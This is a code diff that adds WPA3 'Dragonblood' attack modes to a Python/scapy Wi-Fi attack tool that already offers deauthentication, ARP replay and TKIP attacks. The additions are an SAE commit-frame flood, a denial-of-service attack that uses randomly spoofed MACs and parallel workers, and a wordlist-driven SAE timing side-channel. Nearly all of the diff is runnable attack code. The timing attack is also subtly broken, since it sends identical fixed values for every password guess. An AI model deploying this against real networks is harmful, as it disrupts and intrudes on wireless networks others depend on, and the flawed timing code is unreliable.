@@ -25,6 +25,7 @@ import os
 import random
 import time
 import struct
+import multiprocessing
 from scapy.all import *
 from scapy.layers.dot11 import *
 from scapy.layers.l2 import ARP, Ether
@@ -487,7 +488,114 @@ def reinject_packet(original_pkt, decrypted_data, attacker_mac, iface):
     sendp(new_pkt, iface=iface, count=3, inter=0.1)
     print("[+] Packet reinjected.")
 
-# ================== Argument Parsing and Main ==================
+# ================== DRAGONBLOOD: SAE TIMING SIDE-CHANNEL ATTACK ==================
+def sae_commit_frame(ap_bssid, client_mac, pwe_bytes, scalar_bytes, element_bytes):
+    """
+    Construct an SAE commit frame with given parameters.
+    SAE is 802.11 authentication with auth_alg=3 (SAE).
+    """
+    sa = client_mac
+    bssid = ap_bssid
+    dot11 = Dot11(type=0, subtype=11, addr1=bssid, addr2=sa, addr3=bssid)
+    auth = Dot11Auth(algo=3, seqnum=1, status=0)
+    payload = scalar_bytes + element_bytes
+    frame = RadioTap()/dot11/auth/Raw(load=payload)
+    return frame
+
+def send_sae_and_time(iface, ap_bssid, client_mac, pwe, scalar, element, timeout=0.25):
+    frame = sae_commit_frame(ap_bssid, client_mac, pwe, scalar, element)
+    start = time.perf_counter()
+    sendp(frame, iface=iface, verbose=0)
+    resp = sniff(
+        iface=iface,
+        timeout=timeout,
+        store=1,
+        lfilter=lambda p: (
+            p.haslayer(Dot11Auth)
+            and p.addr1 == client_mac
+            and p.addr2 == ap_bssid
+            and p[Dot11Auth].algo == 3
+            and p[Dot11Auth].seqnum == 2
+        ),
+    )
+    elapsed = (time.perf_counter() - start)
+    if resp:
+        code = resp[0][Dot11Auth].status
+    else:
+        code = None
+    return elapsed, code
+
+def run_sae_timing_worker(args):
+    iface, ap_bssid, client_mac, pw_guess, rep, timeout = args
+    scalar = b"\x11"*32
+    element = b"\x22"*48
+    timings = []
+    for _ in range(rep):
+        t, code = send_sae_and_time(iface, ap_bssid, client_mac, b"", scalar, element, timeout)
+        timings.append((t, code))
+    return (pw_guess, timings)
+
+def sae_timing_attack(args):
+    check_interface(args.interface)
+    print_info(f"Starting SAE Timing Side-Channel Attack on {args.a} (w/ wordlist: {args.P}, MAC: {args.m})")
+    with open(args.P, "r", encoding="utf8") as f:
+        pwlist = [line.strip() for line in f if line.strip()]
+    results = []
+    process_args = []
+    repeat = 5
+    timeout = 0.4
+    for guess in pwlist:
+        process_args.append((args.interface, args.a.lower(), args.m.lower(), guess, repeat, timeout))
+    with multiprocessing.Pool(processes=min(8, multiprocessing.cpu_count())) as pool:
+        for res in pool.imap_unordered(run_sae_timing_worker, process_args):
+            results.append(res)
+            pw, timings = res
+            times = [t for t, code in timings]
+            mean = sum(times)/len(times)
+            stdev = (sum((x-mean)**2 for x in times)/len(times))**0.5
+            print(f"[SAE-TIMING] {pw:20s} avg: {mean:.4f}s std: {stdev:.4f}s results: {times}")
+    print_good("SAE timing attack finished. Analyze output for timing anomalies!")
+
+# ================== DRAGONBLOOD: SAE FLOOD ATTACK ==================
+def random_mac_sae():
+    return "02:%02x:%02x:%02x:%02x:%02x" % (
+        random.randint(0x00, 0x7f),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff),
+        random.randint(0x00, 0xff),
+    )
+
+def random_scalar_element():
+    return os.urandom(32), os.urandom(48)
+
+def sae_flood_worker(args):
+    iface, ap_bssid, n = args
+    sent = 0
+    for _ in range(n):
+        mac = random_mac_sae()
+        scalar, element = random_scalar_element()
+        frame = sae_commit_frame(ap_bssid, mac, b"", scalar, element)
+        try:
+            sendp(frame, iface=iface, verbose=0)
+            sent += 1
+        except Exception as e:
+            continue
+    return sent
+
+def sae_flood_attack(args):
+    check_interface(args.interface)
+    print_info(f"Starting SAE Flood Attack on {args.a}")
+    total = 0
+    workers = min(8, multiprocessing.cpu_count())
+    per_worker = 2000
+    process_args = [(args.interface, args.a.lower(), per_worker) for _ in range(workers)]
+    with multiprocessing.Pool(processes=workers) as pool:
+        results = pool.map(sae_flood_worker, process_args)
+    total = sum(results)
+    print_good(f"SAE Flood attack finished, total packets sent: {total}")
+
+# ================== Argument Parsing and Main (EXTENDED) ==================
 def parse_args():
     parser = argparse.ArgumentParser(description="Advanced WiFi attacks tool for educational use (Linux only)")
     parser.add_argument("--deauth", action='store_true', help="Perform Deauth attack")
@@ -510,6 +618,9 @@ def parse_args():
     parser.add_argument("--tkip-key", help="TKIP key as 32 hex bytes (for --beck-tews)")
     parser.add_argument("--tkip-client", help="Client MAC for Beck-Tews")
     parser.add_argument("--tkip-known", help="Hex known plaintext for Beck-Tews demo")
+    parser.add_argument("--sae-timing", action="store_true", help="Perform SAE Timing Side-Channel Attack (Dragonblood)")
+    parser.add_argument("--sae-flood", action="store_true", help="Perform SAE Flood Attack (Dragonblood)")
+    parser.add_argument("-P", metavar="PWLIST", help="Password wordlist for --sae-timing")
     parser.add_argument("interface", help="Wireless interface in monitor mode")
 
     try:
@@ -539,8 +650,14 @@ def parse_args():
     if args.beck_tews:
         if not (args.a and args.tkip_client and args.tkip_key and args.tkip_known):
             parser.error("Beck-Tews attack requires -a, --tkip-client, --tkip-key, --tkip-known")
-    if not (args.deauth or args.fakeauth or args.arpreplay or args.beacon or args.probe or args.tkip or args.chop_chop or args.beck_tews):
-        parser.error("You must specify at least one attack mode (--deauth, --fakeauth, --arpreplay, --beacon, --probe, --tkip, --chop-chop, --beck-tews)")
+    if args.sae_timing:
+        if not (args.a and args.m and args.P):
+            parser.error("--sae-timing requires -a <BSSID>, -m <YOUR_MAC>, and -P <wordlist>")
+    if args.sae_flood:
+        if not args.a:
+            parser.error("--sae-flood requires -a <BSSID>")
+    if not (args.deauth or args.fakeauth or args.arpreplay or args.beacon or args.probe or args.tkip or args.chop_chop or args.beck_tews or args.sae_timing or args.sae_flood):
+        parser.error("You must specify at least one attack mode (--deauth, --fakeauth, --arpreplay, --beacon, --probe, --tkip, --chop-chop, --beck-tews, --sae-timing, --sae-flood)")
 
     return args
 
@@ -575,6 +692,10 @@ def main():
                 sys.exit(1)
             tk, tx_mic, rx_mic = tkip_key[:16], tkip_key[16:24], tkip_key[24:]
             beck_tews_attack(args.interface, args.a.lower(), args.tkip_client.lower(), (tk, tx_mic, rx_mic), bytes.fromhex(args.tkip_known), args.n)
+        elif args.sae_timing:
+            sae_timing_attack(args)
+        elif args.sae_flood:
+            sae_flood_attack(args)
         else:
             print_error("No valid attack selected")
     except KeyboardInterrupt:
